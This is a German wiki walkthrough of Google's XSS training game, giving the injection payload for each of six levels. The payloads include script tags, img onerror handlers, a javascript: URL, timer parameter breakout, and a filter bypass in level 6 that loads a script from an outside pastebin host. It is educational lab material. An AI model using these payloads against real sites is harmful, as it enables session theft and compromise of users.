## XSS (Cross-Site-Scripting)
Bei XSS geht es darum "evil code" in eine Webseite einzuschleusen um dadurch dann an Informationen zu kommen, welche nicht für den Benutzer bestimmt sind. Google hat ein [Game](https://xss-game.appspot.com/) dafür entwickelt. Ich beschreibe hier die Level, und wie man zum gewünschten Resultat kommt.



----

### Level 1
Im ersten Level hat man ein Eingabefeld zur Verfügung. Da die Daten, welche in diesem Feld sind, nicht escaped werden, kann man nur 
```
<script>alert(1)</script>
```
eingeben und man erreicht das Ziel.



----

### Level 2
Im zweiten Level hat man ebenfalls ein Eingabefeld. Diesmal kann man eine Ausführung von [JavaScript](/de/wiki/programmiersprachen/javascript) nicht einfach nur durch eingabe des "<script>"-Tags erzielen. Man gibt folgendes ein:
```
<img src="x" onerror="alert(1)">
```
Da man jetzt ein Bild lädt, welches nicht existiert, wird das Script im "onerror" ausgeführt.



----

### Level 3
In diesem Level muss man Code über die [HTTP-GET](https://de.wikipedia.org/wiki/Hypertext_Transfer_Protocol#HTTP-Anfragemethoden) Methode einschleusen. Diesmal muss man direkt nach dem "#" ein " ' " (Hochkomma) platzieren, damit im Webseiten-Code die parseInt() funktion nicht mehr greift. Danach fügt man ebenfalls wieder ein Bild ein, welches auf "onerror" ein Script ausführt.
```
https://xss-game.appspot.com/level3/frame#');<img src="x" onerror="alert(1)">
```



----

### Level 4
Im vierten Level geht es darum einen JavaScript Timer zu manipulieren. Dieser nimmt die Zeit, welche er warten muss, ebenfalls über die [HTTP-GET](https://de.wikipedia.org/wiki/Hypertext_Transfer_Protocol#HTTP-Anfragemethoden) Methode. Diesmal übergibt dem Eingabefeld ein " ' " (Hochkomma). Jetzt wird der Timer unendlich lange zählen (er wird nicht ausgeführt). Der ausgeführte Code sieht dann wie folgt aus:
```
startTimer(''')
``` In diesem Zustand kann man dann den "timer=" Parameter Manipulieren. Diesmal kann man jedoch nicht einfach eine ")" ("timer=')") danach einfügen, weil der ausgeführte Code dann folgendermassen aussehen würde:
```
startTimer('')')
```
Jetzt weiss man, dass man so den Code unterbrechen kann. Da man aber nicht "';" schreiben kann ```startTimer('';')``` 
muss man das ";" codieren. Mit %3B erreicht man das.


```
//Parameter
timer='%3B //code here

//Ausgeführte Funktion
startTimer(''); //code here
```
Mit diesem Wissen, könnte man meinen, wäre XSS jetzt möglich.


Ist es nicht. Ein "alert" befehl wird nicht ausgeführt. Man muss dahinter noch irgend welchen weiteren JavaScript Code einfügen. In diesem Beispiel wird einfach eine Variable (b) definiert. Das Resultat sieht dann wie folgt aus
```
//Parameter
timer=')%3Balert(1)%3Bvar b=('

//Ausgeführte Funktion
startTimer('');alert(1);var b=('');
```
Mit diesem Code ist im vierten Level XSS möglich.



----

### Level 5
In diesem Beispiel wird im HTML ''<a href=""<'' Tag der Wert aus der [HTTP-GET](https://de.wikipedia.org/wiki/Hypertext_Transfer_Protocol#HTTP-Anfragemethoden) Methode geholt. Dies kann man nutzen und führt bei Klicken auf den Button JavaScript Code aus. Erzielt wird das, indem man den (next) Parameter folgendermassen manipuliert:
```
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)
```



----

### Level 6
Dieses Level ist das schwierigste von allen. Man muss über den GET-Parameter schadhaften Code von einem [Hosting](http://pastebin.com/raw/rTRPYeNk) einfügen. Da das JavaScript jedoch nur "https:" nicht zulässt (CaseSensitive) kann man den Parameter der [URL](/de/wiki/url) folgendermassen manipulieren ("htTps"):
```
https://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw.php?i=15S5qZs0
```







----

[Die Gesamtlösungen (Englisch)](http://blog.dornea.nu/2014/06/02/googles-xss-game-solutions/)
